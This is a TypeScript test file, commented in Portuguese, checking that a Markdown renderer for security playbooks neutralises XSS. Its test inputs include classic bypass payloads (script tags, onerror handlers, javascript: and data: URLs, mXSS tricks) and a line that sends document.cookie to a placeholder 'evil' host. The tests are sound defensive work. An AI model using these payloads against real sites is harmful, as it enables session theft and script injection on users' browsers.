/**
 * markdown.test.ts
 *
 * A segunda camada de defesa do CP-5: o que o navegador recebe depois do
 * marked + DOMPurify.
 *
 * 🎯 Os payloads abaixo não são inventados por criatividade: são as famílias
 * clássicas de bypass — tag sem fechamento, atributo de evento, esquema de URL
 * executável, HTML aninhado em Markdown, entidade dupla e mXSS. O ponto de
 * testá-las aqui é que a API já sanitiza na escrita: se esta camada só
 * repetisse a primeira, um playbook gravado ANTES dela existir passaria direto.
 *
 *   MD-01  título, lista, ênfase e tabela viram HTML
 *   MD-02  <script> não sobrevive — nem escapado, nem executável
 *   MD-03  atributo de evento inline é removido
 *   MD-04  href não-https vira link morto
 *   MD-05  link externo sai com target=_blank e rel=noopener noreferrer
 *   MD-06  bloco de código mostra o payload como TEXTO
 *   MD-07  nenhum atributo `style`, `id` ou `data-*` passa
 *   MD-08  variações de bypass (aninhado, entidade, maiúsculas, mXSS)
 *   MD-08b <br> sobrevive (é o que a OWASP usa); nenhuma outra tag bruta
 *   MD-09  markdownParaTexto devolve texto puro e truncado
 *   MD-10  entrada vazia/nula não quebra
 */

import { describe, expect, it } from "vitest";
import { markdownParaTexto, renderPlaybookMarkdown } from "./markdown";

const render = renderPlaybookMarkdown;

/** O HTML tem de ser inerte ao virar DOM — não basta "parecer" limpo. */
function comoDom(html: string): HTMLDivElement {
  const div = document.createElement("div");
  div.innerHTML = html;
  return div;
}

describe("renderPlaybookMarkdown (CP-5)", () => {
  it("MD-01 converte Markdown legítimo", () => {
    const html = render(
      ["## Como corrigir", "", "- Use **prepared statements**", "- Valide no _servidor_", "", "| A | B |", "| - | - |", "| 1 | 2 |"].join("\n"),
    );
    expect(html).toContain("<h2>Como corrigir</h2>");
    expect(html).toContain("<strong>prepared statements</strong>");
    expect(html).toContain("<em>servidor</em>");
    expect(html).toContain("<table>");
    expect(comoDom(html).querySelectorAll("li")).toHaveLength(2);
  });

  it("MD-02 não deixa <script> virar script", () => {
    for (const payload of [
      "<script>alert(1)</script>",
      "<SCRIPT SRC=https://evil/x.js></SCRIPT>",
      "<scr<script>ipt>alert(1)</script>",
      "Texto\n\n<script>\nfetch('https://evil/'+document.cookie)\n</script>\n\nMais texto",
    ]) {
      const dom = comoDom(render(payload));
      expect(dom.querySelector("script")).toBeNull();
      // E o conteúdo não some sem deixar rastro: vira texto visível.
      expect(dom.innerHTML).not.toMatch(/<script/i);
    }
  });

  it("MD-03 remove atributo de evento inline", () => {
    for (const payload of [
      '<img src="x" onerror="alert(1)">',
      "<img src=x onerror=alert(1)>",
      "<div onclick='alert(1)'>clique</div>",
      '<a href="https://ok.example" onmouseover="alert(1)">link</a>',
      '<body onload="alert(1)">',
    ]) {
      const dom = comoDom(render(payload));
      for (const el of Array.from(dom.querySelectorAll("*"))) {
        for (const attr of Array.from(el.attributes)) {
          expect(attr.name.toLowerCase().startsWith("on")).toBe(false);
        }
      }
    }
  });

  it("MD-04 href não-https vira link morto", () => {
    for (const href of [
      "javascript:alert(1)",
      "JaVaScRiPt:alert(1)",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "vbscript:msgbox",
      "http://inseguro.example",
    ]) {
      const dom = comoDom(render(`[clique](${href})`));
      const a = dom.querySelector("a");
      // Ou o link sumiu, ou continua no texto sem href clicável.
      if (a) expect(a.getAttribute("href")).toBeNull();
    }

    // Âncora interna continua funcionando (sumário do próprio playbook).
    const interna = comoDom(render("[ir](#secao)")).querySelector("a");
    expect(interna?.getAttribute("href")).toBe("#secao");
    expect(interna?.getAttribute("target")).toBeNull();
  });

  it("MD-05 link externo abre em nova aba sem entregar window.opener", () => {
    const a = comoDom(render("[ASVS](https://owasp.org/asvs)")).querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://owasp.org/asvs");
    expect(a.getAttribute("target")).toBe("_blank");
    const rel = a.getAttribute("rel") ?? "";
    expect(rel).toContain("noopener");
    expect(rel).toContain("noreferrer");
  });

  it("MD-06 bloco de código mostra o payload como texto", () => {
    const html = render(["Exemplo do ataque:", "", "```html", "<script>alert(document.cookie)</script>", "```"].join("\n"));
    const dom = comoDom(html);
    expect(dom.querySelector("script")).toBeNull();
    expect(dom.querySelector("code")).not.toBeNull();
    // O texto do <code> preserva o payload legível — é o conteúdo didático.
    expect(dom.querySelector("code")!.textContent).toContain("<script>alert(document.cookie)</script>");
  });

  it("MD-07 nenhum style, id ou data-* sobrevive", () => {
    const html = render('<p style="position:fixed;top:0" id="x" data-evil="1" class="ok">texto</p>');
    const dom = comoDom(html);
    for (const el of Array.from(dom.querySelectorAll("*"))) {
      expect(el.hasAttribute("style")).toBe(false);
      expect(el.hasAttribute("id")).toBe(false);
      for (const attr of Array.from(el.attributes)) {
        expect(attr.name.startsWith("data-")).toBe(false);
      }
    }
  });

  it("MD-08 resiste às variações clássicas de bypass", () => {
    const payloads = [
      "<iframe src=\"javascript:alert(1)\"></iframe>",
      "<svg><script>alert(1)</script></svg>",
      "<math><mtext><script>alert(1)</script></mtext></math>",
      "<object data=\"data:text/html,<script>alert(1)</script>\"></object>",
      "<embed src=\"https://evil/x.swf\">",
      "<form action=\"https://evil\"><input name=x></form>",
      "<base href=\"https://evil/\">",
      "<link rel=stylesheet href=\"https://evil/x.css\">",
      "<style>@import 'https://evil/x.css';</style>",
      "&lt;script&gt;alert(1)&lt;/script&gt;",
      "<a href=\"&#106;avascript:alert(1)\">x</a>",
      "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    ];

    for (const payload of payloads) {
      const dom = comoDom(render(payload));
      const proibidas = ["script", "iframe", "object", "embed", "form", "base", "link", "style", "svg", "math", "input"];
      for (const tag of proibidas) {
        expect(dom.querySelector(tag)).toBeNull();
      }
      for (const el of Array.from(dom.querySelectorAll("*"))) {
        for (const attr of Array.from(el.attributes)) {
          expect(attr.name.toLowerCase().startsWith("on")).toBe(false);
          expect(attr.value.toLowerCase().replace(/\s/g, "")).not.toContain("javascript:");
        }
      }
    }
  });

  it("MD-08b <br> sobrevive; qualquer outra tag bruta vira texto", () => {
    // O Markdown oficial da OWASP usa <br> dentro de listas (A03). Escapá-la
    // fazia "&lt;br&gt;" aparecer no meio da instrução de correção.
    const dom = comoDom(render("primeira linha<br>segunda linha"));
    expect(dom.querySelectorAll("br")).toHaveLength(1);
    expect(dom.textContent).not.toContain("&lt;");
    expect(dom.textContent).not.toContain("<br>");

    expect(comoDom(render("x <br/> y")).querySelectorAll("br")).toHaveLength(1);

    // E a exceção não abre a porta para nenhuma outra tag.
    for (const tag of ["<b>negrito</b>", "<span>x</span>", "<div>y</div>", "<img src=x>"]) {
      const d = comoDom(render(tag));
      expect(d.querySelector("b, span, div, img")).toBeNull();
    }
  });

  it("MD-09 markdownParaTexto devolve texto puro e truncado", () => {
    const texto = markdownParaTexto("## Título\n\n- item com [link](https://x.example)\n\n```js\ncodigo()\n```");
    expect(texto).not.toContain("#");
    expect(texto).not.toContain("](");
    expect(texto).toContain("item com link");
    expect(texto).not.toContain("codigo()");

    const longo = markdownParaTexto("a ".repeat(400), 50);
    expect(longo.length).toBeLessThanOrEqual(50);
    expect(longo.endsWith("…")).toBe(true);
  });

  it("MD-10 entrada vazia ou nula não quebra", () => {
    expect(render(null)).toBe("");
    expect(render(undefined)).toBe("");
    expect(render("")).toBe("");
    expect(markdownParaTexto(null)).toBe("");
  });
});
